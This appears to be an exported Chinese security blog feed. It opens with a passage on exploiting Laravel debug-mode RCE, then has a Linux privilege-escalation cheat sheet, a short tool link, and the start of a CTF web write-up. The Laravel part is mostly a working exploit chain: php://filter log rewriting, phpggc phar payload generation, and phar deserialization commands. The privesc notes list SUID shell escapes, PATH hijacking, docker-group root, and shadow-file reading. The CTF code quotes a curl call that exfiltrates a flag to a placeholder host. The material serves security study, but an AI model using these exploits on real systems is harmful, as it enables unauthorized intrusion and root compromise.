<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=zlib.inflate/resource=../storage/logs/laravel.log</span><br><span class="line">php://filter/read=bzip2.decompress/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure>

<p><strong>写入payload</strong></p>
<p>在<code>php://filter</code>中有一个很好用的转换过滤器<code>iconv.utf16le.utf-8</code>，它能够把<code>UTF-16</code>字符转化为<code>UTF-8</code>字符，样例如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -ne &#x27;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0[midfix]P\0A\0Y\0L\0O\0A\0D\0[Some suffix ]&#x27; &gt; /tmp/test.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &quot;echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);&quot;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠</span></span><br></pre></td></tr></table></figure>

<p>既可以传入我们完整的payload，又可以让其他正常字符转为无效字符，之后我们直接base64-decode即可写入payload</p>
<p>为了只留下一个payload字段，我们可以在payload的末尾添加一个byte的字符进行干扰即可，如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -ne &#x27;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0X[midfix]P\0A\0Y\0L\0O\0A\0D\0X[Some suffix ]&#x27; &gt; /tmp/test.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &quot;echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);&quot;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠</span></span><br></pre></td></tr></table></figure>

<p>相应的限制条件是：</p>
<ol>
<li>保证第一个payload字段前面的字符串长度是<code>2*n bytes</code>，不然无法解码出payload</li>
<li>保证整个字符串的总体长度是<code>2*n bytes</code>，不然会抛出以下错误<code>file_get_contents(): iconv stream filter (&quot;utf16le&quot;=&gt;&quot;utf-8&quot;): invalid multibyte sequence</code></li>
</ol>
<p>解决方案：</p>
<ol>
<li>因为日志文件部分内容可控，我们可以把前面的内容刚好填充到<code>2*n bytes</code></li>
<li>可以用同一种方法，也可以选择把payload复写两次</li>
</ol>
<p><strong>写入0字节</strong></p>
<p>最后一个问题就是我们无法向日志写入<code>\0</code>字节，这时候我们又可以用到一个转换过滤器<code>convert.quoted-printable-decode</code></p>
<blockquote>
<p><strong>官方说明</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">quoted_printable_decode ( <span class="built_in">string</span> $str ) : <span class="built_in">string</span></span><br></pre></td></tr></table></figure>

<p>该函数返回 quoted-printable 解码之后的 8-bit 字符串 (参考 <a href="http://www.faqs.org/rfcs/rfc2045">» RFC2045</a> 的6.7章节，而不是 <a href="http://www.faqs.org/rfcs/rfc2821">» RFC2821</a> 的4.5.2章节)</p>
<p><strong>格式</strong></p>
<p>(General 8bit representation) Any octet, except a CR or LF that is part of a CRLF line break of the canonical (standard) form of the data being encoded, may be represented by an “&#x3D;” followed by a two digit hexadecimal representation of the octet’s value.  The digits of the hexadecimal alphabet, for this purpose, are “0123456789ABCDEF”.  Uppercase letters must be used; lowercase letters are not allowed.  Thus, for example, the decimal value 12 (US-ASCII form feed) can be represented by “&#x3D;0C”, and the decimal value 61 (US- ASCII EQUAL SIGN) can be represented by “&#x3D;3D”.  This rule must be followed except when the following rules allow an alternative encoding.</p>
</blockquote>
<p>简单来说就是将格式为<code>&quot;=&lt;hex&gt;&quot;</code>的字符串转发为对应ascii的字符串，所以我们可以将空字节编码为<code>&quot;=00&quot;</code>传入</p>
<p>所以最终我们写入payload方法为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure>

<p><strong>生成payload</strong></p>
<p>payload的生成我们可以反序列化工具<code>phpggc</code></p>
<blockquote>
<p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -d &#x27;phar.readonly=0&#x27; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E &#x27;s/=+$//g&#x27; | sed -E &#x27;s/./\0=00/g&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">使用phpggc创建payload，注意这里最后添加了一个<span class="string">&#x27;=00&#x27;</span>，用来屏蔽第二处payload回显</span></span><br><span class="line">php -d &#x27;phar.readonly=0&#x27; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:].zfill(2) + &#x27;=00&#x27; for i in sys.stdin.read()]).upper() + &#x27;=00&#x27;)&quot;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">清空<span class="built_in">log</span>文件</span></span><br><span class="line">viewFile: php://filter/read=consumed/resource=../storage/logs/laravel.log</span><br><span class="line"><span class="meta"># </span><span class="language-bash">传入字符使文本对齐，这里可传入任意文本</span></span><br><span class="line">viewFile: tyao</span><br><span class="line"><span class="meta"># </span><span class="language-bash">传入payload</span></span><br><span class="line">viewFile: =50=00=44=00=39=00=77=00=61=00=48=00...</span><br><span class="line"><span class="meta"># </span><span class="language-bash">解码payload</span></span><br><span class="line">viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</span><br><span class="line"><span class="meta"># </span><span class="language-bash">phar反序列化</span></span><br><span class="line">viewFile: phar://../storage/logs/laravel.log</span><br></pre></td></tr></table></figure>

<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><ol>
<li><p>如果传入的是形如<code>P=00D=009=00w=00...</code>的payload，倒数第二部有可能会产生<code>quoted-printable-decode</code>解码错误，原因如下，有一处省略的地方出现了<code>&quot;=0.&quot;</code>字符串导致解码失败，解决方法是将首字符<code>&#39;P&#39;</code>也进行编码就可以对齐了，懒人方法就是将所有字符进行编码 : &gt;</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281052e3a43478f71ec9e13073.png" alt="image-20210528024447449"></p>
</li>
<li><p>windows下复现失败了，因为是只要在base64的payload中存在<code>&#39;=&#39;</code>时，使用<code>convert.base64-decode</code>过滤器会报错返回空</p>
</li>
<li><p>针对第二种情况，我们将payload的命令进行填充至无<code>&#39;=&#39;</code>出现，但是phar协议反序列化时会报phar文件签名错误，大概率是因为<code>phpggc</code>只能在Linux下使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">failed to open stream: phar &amp;quot;xxxx\\laravel\\storage\\logs\\laravel.log&amp;quot; has a broken signature&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果想要在windows复现估计得重新写一个序列化，为了不麻烦自己，还是在跑去虚拟机复现成功了</p>
</li>
</ol>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021052811469e4b69a8d859b25c0a80.png" alt="image-20210528114607301" style="zoom:67%;" />

<ol start="5">
<li>失败的建议多打几次</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/351363561">https://zhuanlan.zhihu.com/p/351363561</a></p>
<p><a href="https://anquan.baidu.com/article/1286">https://anquan.baidu.com/article/1286</a></p>
<p><a href="https://www.ambionics.io/blog/laravel-debug-rce">https://www.ambionics.io/blog/laravel-debug-rce</a></p>
]]></content>
      <tags>
        <tag>漏洞研究</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux提权小知识</title>
    <url>/2020/05/27/Linux%E6%8F%90%E6%9D%83%E5%B0%8F%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p>稍微总结了一下关于 Linux 提权的小知识</p>
<span id="more"></span>

<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>查看发行版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>

<p>查看内核版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>大多内核漏洞通过内核版本能很快查到</p>
<p>用 kali 自带的 searchsploit 来搜索 exploitdb 中的漏洞利用代码</p>
<blockquote>
<p>根据自己的搜索结果，增加搜索选项，缩小结果范围</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchspoit priv esc linux 2.6 ubuntu</span><br></pre></td></tr></table></figure>

<p>利用第三方工具搜集信息</p>
<p><a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a></p>
<blockquote>
<p>Linux_Exploit_Suggester 能够列举出给定内核在每个公开的Linux内核漏洞上的暴露情况。</p>
<p>Example：</p>
<p>.&#x2F;linux-exploit-suggester.sh –uname <uname-string></p>
</blockquote>
<p><a href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester-2</a></p>
<blockquote>
<p>Linux_Exploit_Suggester 是一款根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行 uname -r 返回的操作系统发行版本，或者手工输入-k 参数查找指定版本号</p>
<p>Example:</p>
<p>perl .&#x2F;Linux_Exploit_Suggester.pl -k 3.0.0</p>
</blockquote>
<p><a href="https://www.securitysift.com/download/linuxprivchecker.py">linuxprivchecker</a></p>
<blockquote>
<p>Linuxprivchecker 本地执行，可以列举出基本的系统信息并搜索常见的提权信息，如普通用户可写文件，错误配置，明文密码和可用的 exp。</p>
<p>Example：</p>
<p>python Linuxprivchecker.py</p>
</blockquote>
<p><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></p>
<blockquote>
<p>LinEnum 可以列出详细的各种系统、文件和服务信息，定位出可能存在提权的地方，与上面的 linuxprivchecker 类似</p>
<p>Example：</p>
<p>.&#x2F;LinEnum.sh -r report -e &#x2F;tmp&#x2F; -t</p>
</blockquote>
<p>当内核版本没有好用的exp对应的时候，可以检查磁盘格式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>

<p>和已经安装的程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br></pre></td></tr></table></figure>



<h2 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h2><p>大多 linux 系统的密码都和 &#x2F;etc&#x2F;passwd 和 &#x2F;etc&#x2F;shadow 这两个配置文件息息相关。passwd 里面存储了用户，shadow 里面存储了密码的 hash</p>
<p>出于安全考虑 passwd 是全用户可读，root可写的，而 shadow 是仅 root 可读写的</p>
<p><strong>检查文件权限</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">ls -l passwd shadow</span><br></pre></td></tr></table></figure>

<p><strong>&#x2F;etc&#x2F;passwd 可写</strong></p>
<p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了</p>
<p>如果 passwd 可写，我们就可以把 root 的密码字段替换成一个已知密码的 hash，这样系统在验证密码时以 passwd 的为准</p>
<p><strong>&#x2F;etc&#x2F;shadow 可读</strong></p>
<p>如果shadow可读，我们可以读走 root 的 hash，然后用 hashcat 或者 john 暴力破解。</p>
<p><strong>启动终端</strong></p>
<p>出于安全考虑，linux 要求用户必须从<strong>终端设备</strong>（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo 在你输入密码的时候本质上是读取了键盘，而不是 bash 里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。我们可以利用 python 启动一个终端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p>就用 python 建立了一个虚拟终端，然后就可以使用 sudo 等等命令了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo su</span></span><br><span class="line">[sudo] password for ctf: </span><br><span class="line">Sorry, try again.</span><br></pre></td></tr></table></figure>



<h2 id="sudo-滥用"><a href="#sudo-滥用" class="headerlink" title="sudo 滥用"></a>sudo 滥用</h2><p>sudo 是让普通用户使用超级用户的命令，其配置文件为 &#x2F;etc&#x2F;sudoers，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p>
<p>利用 <code>sudo -l</code> 查看当前用户可使用的 sudo 命令</p>
<p>然后我们可以参考 <a href="https://gtfobins.github.io/">https://gtfobins.github.io</a> 进行提权</p>
<blockquote>
<p>强烈推荐此博客，它整理了 Unix 内部可用于绕过本地安全限制的二进制文件</p>
</blockquote>
<h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h2><p>系统内可能会有一些定时执行的任务，一般这些任务由 crontab 来管理，具有所属用户的权限。非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 &#x2F;etc 内系统的计划任务可以被列出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure>

<p>默认这些程序以 root 权限执行，如果有幸遇到其中一个脚本被配置成任意用户可写，我们就可以修改脚本等反弹 root shell。</p>
<blockquote>
<p>rontab 计划任务千万不要写到 &#x2F;etc&#x2F;crontab 文件里。通过 crontab -e 去创建，让他写到默认的 &#x2F;var&#x2F;spool&#x2F;cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p>
</blockquote>
<h2 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h2><p>SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行。比如 passwd 命令，就是以 root 权限运行来修改 shadow 的。</p>
<blockquote>
<p>注意：只有这个程序的所有者是 0 号或其他 super user，同时拥有 SUID　权限，才可以提权。</p>
<p>参考：<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p>
</blockquote>
<p>命令行查找 SUID 文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>这里举一个例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setuid(<span class="number">0</span>); <span class="comment">// 以root用户执行</span></span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以 root 进行编译和权限设置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc pri.c -o pri</span><br><span class="line">chmod u+s ./pri # 这里设置了SUID位</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">total 24</span><br><span class="line">-rwsr-xr-x 1 root root 16616 May 27 05:59 pri</span><br><span class="line">-rw-r--r-- 1 root root    95 May 27 05:57 pri.c</span><br></pre></td></tr></table></figure>

<p>注意 s 属性，表示这个程序有 SUID 属性。</p>
<p>接下来我们切换用户并执行可以发现提权成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su ctf</span><br><span class="line">./pri</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527180236.png" alt="image-20200527180232737"></p>
<p>而除了借助程序功能提权，我们还可以尝试劫持环境变量提权。上文的 pri 程序使用了 system 函数，system 函数是继承环境变量的，因此我们通过替换环境变量可以达到执行任意命令的效果。</p>
<p>继续以上面的 pri 程序为例，我们来尝试劫持 id 命令，修改环境变量路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>

<p><strong>方法一</strong></p>
<p>修改 id 命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;/bin/sh&#x27; &gt; /tmp/id</span><br><span class="line">chmod 777 /tmp/id</span><br></pre></td></tr></table></figure>

<p><strong>方法二</strong></p>
<p>直接复制一个 bash</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /bin/sh /tmp/id</span><br></pre></td></tr></table></figure>

<p><strong>方法三</strong></p>
<p>建立一个软链接（需要一定的权限）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /bin/sh /tmp/id</span><br><span class="line">export PATH=.:$PATH</span><br></pre></td></tr></table></figure>

<p>运行程序提权</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">./pri</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">whoami</span></span></span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>这里列出一些常用的可用于 SUID 提权的文件</p>
<blockquote>
<p>这里我们也可以再次借鉴神博客 <a href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- nmap</span><br><span class="line">- Vim</span><br><span class="line">- find</span><br><span class="line">- bash</span><br><span class="line">- more</span><br><span class="line">- less</span><br><span class="line">- nano</span><br><span class="line">- cp</span><br></pre></td></tr></table></figure>

<p><strong>namp</strong></p>
<p>较旧版本的 Nmap（2.02~5.21）带有交互模式，从而允许用户执行 shell 命令。由于 Nmap 位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。</p>
<p>可以使用下命令进入namp交互模式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>

<p>执行命令后会返回一个shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">nmap&gt; </span><span class="language-bash">!sh</span></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>而在 Metasploit 中也有一个模块可以通过 SUID nmap 进行提权</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit/unix/local/setuid_nmap</span><br></pre></td></tr></table></figure>

<p><strong>vim</strong></p>
<p>Vim 的主要用途是用作文本编辑器。 但是，如果以 SUID 运行，它将继承 root 用户的权限，因此可以读取系统上的所有文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/shadow</span><br></pre></td></tr></table></figure>

<p><strong>find</strong></p>
<p>如果 find 以 SUID 权限运行，所有通过 find 执行的命令都会以 root 权限运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure>

<p><strong>bash</strong></p>
<p>以下命令将以 root 身份打开一个 bash shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line">uid=500(cow) gid=500(cow) euid=0(root) groups=500(cow)</span><br></pre></td></tr></table></figure>

<p><strong>less</strong></p>
<p>程序 less 也可以执行提权后的 shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

<p><strong>nano</strong></p>
<p>以下命令可以打开一个提权后的 shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./nano</span><br><span class="line">^R^X</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>

<p><strong>cp</strong></p>
<p>写文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">LFILE=file_to_write</span><br><span class="line">echo &quot;DATA&quot; | ./cp /dev/stdin &quot;$LFILE&quot;</span><br></pre></td></tr></table></figure>

<p>执行命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">LFILE=file_to_write</span><br><span class="line">TF=$(mktemp)</span><br><span class="line">echo &quot;DATA&quot; &gt; $TF</span><br><span class="line">./cp $TF $LFILE</span><br></pre></td></tr></table></figure>



<h2 id="Docker-组提权"><a href="#Docker-组提权" class="headerlink" title="Docker 组提权"></a>Docker 组提权</h2><p>docker 组用户提权，目的是利用 docker 组的用户来提权，因为 docker 组用户在容器下为 root 权限，通过挂载方式在容器下给本机添加 sudo 权限的用户，从而可以利用 sudo 命令。</p>
<p>参考 <a href="https://fosterelli.co/privilege-escalation-via-docker.html">https://fosterelli.co/privilege-escalation-via-docker.html</a></p>
<p>普通用户执行这条命令就可以获得root权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>

<p>如果没有拥有 sudo 权限的用户，是无法执行 sudo 命令，在 kali 下会提示用户不在 sudoers 等提示。 </p>
<h2 id="服务漏洞"><a href="#服务漏洞" class="headerlink" title="服务漏洞"></a>服务漏洞</h2><p>有一些服务器的服务会被配置成对内网或者对本机开放。通过对他们的攻击我们有机会接触更多的敏感文件，或是运气足够好碰上一个远程 root 漏洞。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -antup # 查看各种网络服务</span><br></pre></td></tr></table></figure>

<p>如果找到些神秘的服务，可以用 netcat 或者 socat 等工具做端口转发</p>
<p>nc 单向转发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -l 8080 | nc remote_host 4444</span><br></pre></td></tr></table></figure>

<p>nc 双向转发</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkfifo backpipe nc -l 8080 0&lt;backpipe | nc remote_host 4444 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<p>socat tcp 转发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat -d TCP4-LISTEN:80,reuseaddr,fork TCP4:remote_host:4444</span><br></pre></td></tr></table></figure>

<p>socat udp 转发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat -T 600 UDP4-LISTEN:5353,reuseaddr,fork UDP4:remote_host:4444</span><br></pre></td></tr></table></figure>



<p>常见服务漏洞</p>
<ul>
<li>redis</li>
<li>mysql</li>
<li>mssql</li>
<li>nfs</li>
</ul>
<p><strong>参考资料</strong></p>
<p><a href="https://www.freebuf.com/articles/system/129549.html">https://www.freebuf.com/articles/system/129549.html</a></p>
<p><a href="http://zone.secevery.com/article/1104">http://zone.secevery.com/article/1104</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1544037">https://cloud.tencent.com/developer/article/1544037</a></p>
]]></content>
      <tags>
        <tag>PRACTICE</tag>
      </tags>
  </entry>
  <entry>
    <title>MD上传图床小工具</title>
    <url>/2020/05/26/MD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>简单地整了一个 MarkDown 本地图片一键上传 SM.MS 的小工具</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Tyaoo/SMMS</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Study</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 GYXCTF Web</title>
    <url>/2020/03/18/2020-GYXCTF-Web/</url>
    <content><![CDATA[<p>师傅们出的题目都挺有意思</p>
<p>自己还是有很大差距</p>
<span id="more"></span>

<h2 id="dooog"><a href="#dooog" class="headerlink" title="dooog"></a>dooog</h2><p>下载源文件后查看主要有三个站，分别是 client 端、cmd_server 端和 kdc 端，下面是我整理三个文件夹逻辑，随缘看一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cmd_server/app.py</span></span><br><span class="line"></span><br><span class="line">flag = os.system(<span class="string">&quot;curl http://xxxxxx/`readflag`&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> os.system(msg[<span class="number">2</span>])</span><br><span class="line"><span class="number">2.</span> username == msg[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> username = cryptor.decrypt(base64.b64decode(authenticator))</span><br><span class="line"><span class="number">4.</span> authenticator = request.form.get(<span class="string">&#x27;authenticator&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> msg = cryptor.decrypt(base64.b64decode(server_message)).split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="number">6.</span> server_message = request.form.get(<span class="string">&#x27;server_message&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># client/app.py</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> res = requests.post(<span class="string">&#x27;http://cmd_server:5002/cmd&#x27;</span>, data=&#123;<span class="string">&#x27;server_message&#x27;</span>: server_message, <span class="string">&#x27;authenticator&#x27;</span>: authenticator&#125;)</span><br><span class="line"><span class="number">2.</span> client_message, server_message = res.content.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="number">3.</span> res = requests.post(<span class="string">&#x27;http://kdc:5001/getTicket&#x27;</span>,  data=&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;cmd&#x27;</span>: cmd, <span class="string">&#x27;authenticator&#x27;</span>: base64.b64encode(authenticator), <span class="string">&#x27;TGT&#x27;</span>: session[<span class="string">&#x27;TGT&#x27;</span>]&#125;)</span><br><span class="line"><span class="number">4.</span> authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;timestamp&#x27;</span>: <span class="built_in">int</span>(time.time())&#125;))</span><br><span class="line"><span class="number">5.</span> username = form.username.data</span><br><span class="line"><span class="number">6.</span> session[<span class="string">&#x27;session_key&#x27;</span>], session[<span class="string">&#x27;TGT&#x27;</span>] = cryptor.decrypt(base64.b64decode(res.content.split(<span class="string">&#x27;|&#x27;</span>)[<span class="number">0</span>])), res.content.split(<span class="string">&#x27;|&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="number">7.</span> res = requests.post(<span class="string">&#x27;http://kdc:5001/getTGT&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;authenticator&#x27;</span>: base64.b64encode(authenticator)&#125;)</span><br><span class="line"><span class="number">8.</span> authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">&#x27;username&#x27;</span>:username, <span class="string">&#x27;timestamp&#x27;</span>: <span class="built_in">int</span>(time.time())&#125;))</span><br><span class="line"><span class="number">9.</span> username = form.username.data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># kdc/app.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /getTicket</span></span><br><span class="line"><span class="number">1.</span> <span class="keyword">return</span> client_message + <span class="string">&#x27;|&#x27;</span> + server_message</span><br><span class="line"><span class="number">2.</span> server_message = base64.b64encode(cryptor.encrypt(session_key + <span class="string">&#x27;|&#x27;</span> + data[<span class="string">&#x27;username&#x27;</span>] + <span class="string">&#x27;|&#x27;</span> + cmd))</span><br><span class="line"><span class="number">3.</span> data = json.loads(cryptor.decrypt(base64.b64decode(authenticator)))</span><br><span class="line"><span class="number">4.</span> authenticator = request.form.get(<span class="string">&#x27;authenticator&#x27;</span>)</span><br><span class="line">-------------------------</span><br><span class="line"><span class="comment"># /getTGT</span></span><br><span class="line"><span class="number">1.</span> <span class="keyword">return</span> session_key_enc + <span class="string">&#x27;|&#x27;</span> + TGT</span><br><span class="line"><span class="number">2.</span> TGT = base64.b64encode(cryptor.encrypt(username + <span class="string">&#x27;|&#x27;</span> + session_key + <span class="string">&#x27;|&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))))</span><br><span class="line"><span class="number">3.</span> data[<span class="string">&#x27;username&#x27;</span>] == username</span><br><span class="line"><span class="number">4.</span> data = json.loads(cryptor.decrypt(base64.b64decode(authenticator)))</span><br><span class="line"><span class="number">5.</span> authenticator = request.form.get(<span class="string">&#x27;authenticator&#x27;</span>)</span><br></pre></td></tr></table></figure>

